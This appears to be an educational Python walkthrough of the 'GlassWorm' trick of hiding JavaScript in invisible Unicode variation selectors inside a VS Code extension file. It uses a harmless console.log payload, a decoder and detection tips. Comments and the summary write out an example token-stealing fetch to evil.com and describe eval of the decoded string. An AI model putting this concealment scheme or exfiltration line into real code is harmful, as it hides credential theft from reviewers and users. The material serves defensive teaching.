#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  GlassWorm Technique — Educational Demo (SAFE / Hello World)   ║
║  For security engineers & pentesters to understand the attack   ║
╚══════════════════════════════════════════════════════════════════╝

This program walks you through the EXACT technique GlassWorm uses,
step by step, but with a harmless "Hello, World!" payload instead
of anything malicious.

Run it:  python3 glassworm_educational_demo.py
"""

import os
import sys

# ═══════════════════════════════════════════════════════════════════
# COLOR HELPERS (just for pretty terminal output)
# ═══════════════════════════════════════════════════════════════════
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"


def banner(step_num, title):
    print(f"\n{'═'*65}")
    print(f"  {BOLD}{CYAN}STEP {step_num}{RESET}: {BOLD}{title}{RESET}")
    print(f"{'═'*65}\n")


def pause():
    input(f"\n  {DIM}[Press Enter to continue to next step...]{RESET}\n")


# ═══════════════════════════════════════════════════════════════════
# STEP 0: Intro
# ═══════════════════════════════════════════════════════════════════
print(f"""
{BOLD}╔══════════════════════════════════════════════════════════════╗
║     GlassWorm Invisible Unicode — Educational Walkthrough    ║
║     ─────────────────────────────────────────────────────     ║
║     Payload: console.log("Hello from invisible code!")       ║
║     Purpose: Learn the encoding trick, not cause harm        ║
╚══════════════════════════════════════════════════════════════╝{RESET}

  This demo will:
    1. Show you the original payload (a harmless console.log)
    2. Break each character into bytes
    3. Split each byte into two 4-bit nibbles
    4. Map each nibble to an invisible Unicode character
    5. Write a "fake infected" JS file
    6. Show you what VS Code would display vs what's really there
    7. Decode it back to prove the round-trip works
    8. Let you scan it with the detection scanner
""")
pause()


# ═══════════════════════════════════════════════════════════════════
# STEP 1: The original payload
# ═══════════════════════════════════════════════════════════════════
banner(1, "The original payload (what the attacker wants to run)")

# This is our HARMLESS payload. In a real attack, this would be
# something like: fetch("https://evil.com/steal?t=" + process.env.GITHUB_TOKEN)
# But we're using a simple console.log for education.

PAYLOAD = 'console.log("Hello from invisible code!")'

print(f"  The attacker wants to secretly execute this JavaScript:")
print(f"  {YELLOW}{PAYLOAD}{RESET}")
print(f"\n  Length: {len(PAYLOAD)} characters")
print(f"  Bytes:  {len(PAYLOAD.encode('utf-8'))} bytes (all plain ASCII)")
print(f"\n  In a normal attack, this would steal tokens, install a RAT, etc.")
print(f"  For this demo, it just prints a message.")

pause()


# ═══════════════════════════════════════════════════════════════════
# STEP 2: Convert each character to its byte value
# ═══════════════════════════════════════════════════════════════════
banner(2, "Convert each character to its byte value")

print(f"  Every character has a numeric byte value (ASCII/UTF-8).")
print(f"  Let's see the first 10 characters:\n")
print(f"  {'Char':<8} {'ASCII Decimal':<16} {'Hex':<10} {'Binary'}")
print(f"  {'─'*8} {'─'*16} {'─'*10} {'─'*10}")

for i, ch in enumerate(PAYLOAD[:10]):
    byte_val = ord(ch)
    print(f"  {repr(ch):<8} {byte_val:<16} 0x{byte_val:02X}       {byte_val:08b}")

print(f"\n  ... and {len(PAYLOAD) - 10} more characters.")
print(f"\n  {DIM}Key insight: Each character is just a number (byte).{RESET}")
print(f"  {DIM}GlassWorm needs to hide these numbers using invisible characters.{RESET}")

pause()


# ═══════════════════════════════════════════════════════════════════
# STEP 3: Split each byte into two nibbles
# ═══════════════════════════════════════════════════════════════════
banner(3, "Split each byte into two 4-bit nibbles")

print(f"  A byte is 8 bits. A nibble is 4 bits (half a byte).")
print(f"  A nibble can be 0-15, which is exactly 0x0 to 0xF.")
print(f"\n  Why split? Because the Variation Selectors U+FE00 to U+FE0F")
print(f"  give us exactly 16 invisible characters — perfect for one nibble!")
print(f"\n  Let's see how the first 5 characters split:\n")

print(f"  {'Char':<6} {'Byte':<8} {'Binary':<12} {'High Nibble':<14} {'Low Nibble'}")
print(f"  {'─'*6} {'─'*8} {'─'*12} {'─'*14} {'─'*12}")

for ch in PAYLOAD[:5]:
    byte_val = ord(ch)
    high = (byte_val >> 4) & 0x0F   # Shift right 4 bits, keep lower 4
    low = byte_val & 0x0F            # Just keep lower 4 bits
    binary = f"{byte_val:08b}"

    print(f"  {repr(ch):<6} 0x{byte_val:02X}     "
          f"{MAGENTA}{binary[:4]}{RESET}{CYAN}{binary[4:]}{RESET}      "
          f"{MAGENTA}{high} (0x{high:X}){RESET}        "
          f"{CYAN}{low} (0x{low:X}){RESET}")

print(f"""
  {DIM}How the split works (for 'c' = 0x63 = 01100011):{RESET}

    Byte:          0 1 1 0 0 0 1 1     (0x63)
                   ├───────┤ ├───────┤
    High nibble:   0 1 1 0             = 6   (byte >> 4)
    Low nibble:              0 0 1 1   = 3   (byte & 0x0F)

  {DIM}So 'c' becomes two numbers: 6 and 3{RESET}""")

pause()


# ═══════════════════════════════════════════════════════════════════
# STEP 4: Map each nibble to an invisible Unicode character
# ═══════════════════════════════════════════════════════════════════
banner(4, "Map each nibble to an invisible character")

print(f"  Now the magic trick! We add 0xFE00 to each nibble value.")
print(f"  This gives us a Variation Selector character, which is INVISIBLE.\n")

print(f"  The 16 Variation Selectors:\n")
print(f"  {'Nibble':<10} {'+ 0xFE00':<12} {'Result':<12} {'Visible?'}")
print(f"  {'─'*10} {'─'*12} {'─'*12} {'─'*10}")

for n in range(16):
    result = 0xFE00 + n
    char = chr(result)
    # Try to show that printing it produces nothing
    print(f"  {n:<10} 0x{n:X} + FE00   U+{result:04X}       "
          f"{RED}NO — renders as nothing{RESET}")

print(f"""
  {BOLD}This is the core of the attack:{RESET}
  These characters are {BOLD}real Unicode characters{RESET} — they exist in
  the file, they take up bytes on disk, but when your editor tries
  to display them, it draws {RED}absolutely nothing{RESET}.

  Let's encode 'c' (0x63):
    High nibble 6 → 6 + 0xFE00 = U+FE06 (invisible)
    Low nibble  3 → 3 + 0xFE00 = U+FE03 (invisible)

  Two invisible characters now represent the letter 'c'.""")

pause()


# ═══════════════════════════════════════════════════════════════════
# STEP 5: Encode the full payload
# ═══════════════════════════════════════════════════════════════════
banner(5, "Encode the FULL payload into invisible characters")

encoded_chars = []
encoding_log = []

for ch in PAYLOAD:
    byte_val = ord(ch)
    high = (byte_val >> 4) & 0x0F
    low = byte_val & 0x0F
    vs_high = chr(0xFE00 + high)
    vs_low = chr(0xFE00 + low)
    encoded_chars.append(vs_high)
    encoded_chars.append(vs_low)
    encoding_log.append((ch, byte_val, high, low, 0xFE00 + high, 0xFE00 + low))

invisible_payload = "".join(encoded_chars)

print(f"  Encoding each character of: {YELLOW}{PAYLOAD}{RESET}\n")
print(f"  {'Char':<6} {'Byte':<8} {'High':<8} {'Low':<8} {'→ VS High':<12} {'→ VS Low'}")
print(f"  {'─'*6} {'─'*8} {'─'*8} {'─'*8} {'─'*12} {'─'*10}")

for i, (ch, bv, h, l, vsh, vsl) in enumerate(encoding_log[:15]):
    print(f"  {repr(ch):<6} 0x{bv:02X}     "
          f"{h:<8} {l:<8} "
          f"U+{vsh:04X}      U+{vsl:04X}")

if len(encoding_log) > 15:
    print(f"  ... and {len(encoding_log) - 15} more characters")

print(f"\n  {BOLD}Result:{RESET}")
print(f"    Original payload:  {len(PAYLOAD)} visible characters")
print(f"    Encoded payload:   {len(invisible_payload)} invisible characters")
print(f"    Bytes on disk:     {len(invisible_payload.encode('utf-8'))} bytes")
print(f"\n  Let me try to print the encoded payload between these arrows:")
print(f"    ▶{invisible_payload}◀")
print(f"    {RED}^^^ See anything? You shouldn't! It's all invisible.{RESET}")

pause()


# ═══════════════════════════════════════════════════════════════════
# STEP 6: Build the fake infected extension file
# ═══════════════════════════════════════════════════════════════════
banner(6, "Build a 'fake infected' VS Code extension file")

print(f"  Now we create a file that looks like a normal extension,")
print(f"  but has our invisible payload hidden on line 2.\n")

# This is EXACTLY how GlassWorm structures its infected files:
# Line 1: Normal import
# Line 2: THE INVISIBLE PAYLOAD (looks like a blank line)
# Line 3+: Normal code + the decoder function

infected_js = f"""import * as vscode from 'vscode';
{invisible_payload}
export function activate(context) {{

    // =====================================================
    // THE DECODER — this part is visible but looks harmless
    // =====================================================
    // A code reviewer might think this is just a Unicode
    // utility function. But it's actually reconstructing
    // the hidden payload from the invisible characters.

    // Get the invisible string from line 2 of this file
    // (In real GlassWorm, this is done more cleverly)
    const invisibleLine = {repr(invisible_payload)};

    // The decoder: reverse the encoding
    let decoded = [];
    for (let i = 0; i < invisibleLine.length; i += 2) {{
        // Step 1: Get the code point of each invisible char
        const highChar = invisibleLine.codePointAt(i);
        const lowChar  = invisibleLine.codePointAt(i + 1);

        // Step 2: Subtract 0xFE00 to get the original nibble
        const highNibble = highChar - 0xFE00;
        const lowNibble  = lowChar  - 0xFE00;

        // Step 3: Recombine: shift high left 4 bits, OR with low
        const originalByte = (highNibble << 4) | lowNibble;

        // Step 4: Convert byte back to character
        decoded.push(String.fromCharCode(originalByte));
    }}

    // The recovered payload as a string
    const recoveredCode = decoded.join("");

    // ⚠️  In real GlassWorm, this would be:
    //     eval(recoveredCode);
    // Which would EXECUTE the hidden malicious JavaScript!
    //
    // For this demo, we just log it safely:
    console.log("Decoded payload:", recoveredCode);
}}

export function deactivate() {{}}
"""

# Write the file
output_dir = "glassworm_education_output"
os.makedirs(output_dir, exist_ok=True)
infected_path = os.path.join(output_dir, "fake_infected_extension.js")

with open(infected_path, "w", encoding="utf-8") as f:
    f.write(infected_js)

file_size = os.path.getsize(infected_path)

print(f"  {GREEN}✓ Written to: {infected_path}{RESET}")
print(f"  File size: {file_size} bytes\n")

# Now show what it looks like
print(f"  {BOLD}What VS Code would show you:{RESET}")
print(f"  {'─'*55}")

for i, line in enumerate(infected_js.split("\n")[:8], 1):
    # Strip invisible characters to simulate what VS Code renders
    visible_line = "".join(c for c in line if not (0xFE00 <= ord(c) <= 0xFE0F))
    if any(0xFE00 <= ord(c) <= 0xFE0F for c in line):
        print(f"  {BLUE}{i:3d}{RESET} │ {DIM}(empty line){RESET}     "
              f"← {RED}{BOLD}PAYLOAD IS HERE!{RESET}")
    else:
        print(f"  {BLUE}{i:3d}{RESET} │ {visible_line}")

print(f"  {'─'*55}")
print(f"\n  {BOLD}What's ACTUALLY on line 2:{RESET}")
# Count invisible chars on line 2
line2 = infected_js.split("\n")[1]
inv_count = sum(1 for c in line2 if 0xFE00 <= ord(c) <= 0xFE0F)
print(f"  → {RED}{inv_count} invisible Unicode characters{RESET}")
print(f"  → {len(line2.encode('utf-8'))} bytes of hidden data")
print(f"  → Encodes: {YELLOW}{PAYLOAD}{RESET}")

pause()


# ═══════════════════════════════════════════════════════════════════
# STEP 7: Decode it back (prove the round-trip)
# ═══════════════════════════════════════════════════════════════════
banner(7, "Decode it back — reversing the encoding")

print(f"  Now let's be the decoder and recover the original payload.\n")

decoded_chars = []

print(f"  {'Pair#':<8} {'VS High':<10} {'VS Low':<10} "
      f"{'High-FE00':<12} {'Low-FE00':<11} {'Combined':<11} {'Char'}")
print(f"  {'─'*8} {'─'*10} {'─'*10} {'─'*12} {'─'*11} {'─'*11} {'─'*6}")

for i in range(0, len(invisible_payload), 2):
    pair_num = i // 2
    high_cp = ord(invisible_payload[i])
    low_cp = ord(invisible_payload[i + 1])

    high_nibble = high_cp - 0xFE00
    low_nibble = low_cp - 0xFE00
    original_byte = (high_nibble << 4) | low_nibble
    original_char = chr(original_byte)
    decoded_chars.append(original_char)

    if pair_num < 12:  # Show first 12
        print(f"  {pair_num:<8} U+{high_cp:04X}    U+{low_cp:04X}    "
              f"{high_nibble:<12} {low_nibble:<11} "
              f"0x{original_byte:02X}       {repr(original_char)}")

if len(PAYLOAD) > 12:
    print(f"  ... {len(PAYLOAD) - 12} more pairs ...")

recovered = "".join(decoded_chars)

print(f"\n  {BOLD}Decoded result:{RESET}")
print(f"    {GREEN}{recovered}{RESET}")
print(f"\n  {BOLD}Original payload:{RESET}")
print(f"    {YELLOW}{PAYLOAD}{RESET}")
print(f"\n  Match: {GREEN if recovered == PAYLOAD else RED}"
      f"{recovered == PAYLOAD}{RESET} "
      f"{'✓ Perfect round-trip!' if recovered == PAYLOAD else '✗ Mismatch!'}")

pause()


# ═══════════════════════════════════════════════════════════════════
# STEP 8: Hex dump — proof the invisible chars are in the file
# ═══════════════════════════════════════════════════════════════════
banner(8, "Hex dump — see the invisible bytes on disk")

print(f"  The file looks empty on line 2, but let's look at the raw bytes.")
print(f"  Each invisible character (U+FE00-FE0F) encodes as 3 UTF-8 bytes.\n")

with open(infected_path, "rb") as f:
    raw = f.read()

# Find where line 2 starts (after first newline)
first_newline = raw.index(b"\n")
line2_start = first_newline + 1

# Find where line 2 ends (next newline)
second_newline = raw.index(b"\n", line2_start)
line2_bytes = raw[line2_start:second_newline]

print(f"  Line 2 raw bytes ({len(line2_bytes)} bytes):")
print(f"  The 'empty' line is actually this:\n")

# Show hex dump of first 48 bytes
for row_start in range(0, min(48, len(line2_bytes)), 16):
    chunk = line2_bytes[row_start:row_start + 16]
    hex_part = " ".join(f"{b:02X}" for b in chunk)
    # UTF-8 encoding of U+FE0x is: EF B8 8x
    # Highlight the variation selector bytes
    highlighted = ""
    for b in chunk:
        if b == 0xEF:
            highlighted += f"{RED}{b:02X}{RESET} "
        elif b == 0xB8:
            highlighted += f"{MAGENTA}{b:02X}{RESET} "
        elif 0x80 <= b <= 0x8F:
            highlighted += f"{YELLOW}{b:02X}{RESET} "
        else:
            highlighted += f"{b:02X} "

    print(f"  {row_start:4d}: {highlighted}")

print(f"\n  {DIM}Pattern: Every 3 bytes = one invisible character{RESET}")
print(f"  {RED}EF{RESET} {MAGENTA}B8{RESET} {YELLOW}8x{RESET} = U+FE0x "
      f"(where x is the nibble value 0-F)")
print(f"\n  Total 'invisible' bytes on line 2: {len(line2_bytes)}")
print(f"  That's {len(line2_bytes)} bytes hiding in what looks like a blank line!")

pause()


# ═══════════════════════════════════════════════════════════════════
# STEP 9: Run the scanner on our fake infected file
# ═══════════════════════════════════════════════════════════════════
banner(9, "Scan it with the GlassWorm detector")

print(f"  Let's see if our scanner catches it.\n")

scanner_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "glassworm_scanner.py")
if os.path.exists(scanner_path):
    print(f"  Running: python3 glassworm_scanner.py {infected_path}\n")
    os.system(f"python3 {scanner_path} {infected_path}")
else:
    print(f"  {YELLOW}Scanner not found at {scanner_path}{RESET}")
    print(f"  Place glassworm_scanner.py in the same directory and re-run.")

pause()


# ═══════════════════════════════════════════════════════════════════
# STEP 10: Summary
# ═══════════════════════════════════════════════════════════════════
banner(10, "Summary — the full attack in one picture")

print(f"""
  {BOLD}THE GLASSWORM TECHNIQUE IN 6 STEPS:{RESET}

  ┌─────────────────────────────────────────────────────────┐
  │  1. {YELLOW}START:{RESET} Attacker has malicious JS code              │
  │     fetch("https://evil.com/steal?t=" + token)          │
  │                         │                                │
  │                         ▼                                │
  │  2. {MAGENTA}ENCODE:{RESET} Split each byte into 2 nibbles (4 bits)  │
  │     'f' (0x66) → high=6, low=6                          │
  │                         │                                │
  │                         ▼                                │
  │  3. {RED}MAP:{RESET} Add 0xFE00 to each nibble                     │
  │     6 → U+FE06 (invisible), 6 → U+FE06 (invisible)     │
  │                         │                                │
  │                         ▼                                │
  │  4. {BLUE}INJECT:{RESET} Insert invisible chars into extension file │
  │     Line 1: import * as vscode ...                       │
  │     Line 2: {DIM}(looks empty — 100s of invisible chars){RESET}     │
  │     Line 3: export function activate() ...               │
  │                         │                                │
  │                         ▼                                │
  │  5. {CYAN}DECODE:{RESET} Small visible decoder reads the chars      │
  │     codePointAt(i) - 0xFE00 → nibble                    │
  │     (highNibble << 4) | lowNibble → original byte       │
  │                         │                                │
  │                         ▼                                │
  │  6. {RED}{BOLD}EXECUTE:{RESET} eval(decodedString)                       │
  │     The hidden payload runs with full extension access!  │
  └─────────────────────────────────────────────────────────┘

  {BOLD}WHY IT'S DANGEROUS:{RESET}
    • VS Code extensions run with {RED}full system access{RESET}
    • The invisible payload passes {RED}all code reviews{RESET}
    • Auto-update means you get infected {RED}without clicking anything{RESET}
    • Stolen tokens let the worm {RED}spread to more extensions{RESET}

  {BOLD}HOW TO DETECT IT:{RESET}
    • Scan for variation selector clusters (3+ = suspicious)
    • Look for decoder patterns near invisible chars
    • Use tools: glassworm-hunter, anti-trojan-source, or
      the glassworm_scanner.py from this toolkit
    • Integrate scanning into CI/CD and git pre-commit hooks

  {GREEN}Files generated in ./{output_dir}/{RESET}
    • fake_infected_extension.js — the "infected" file to study
""")
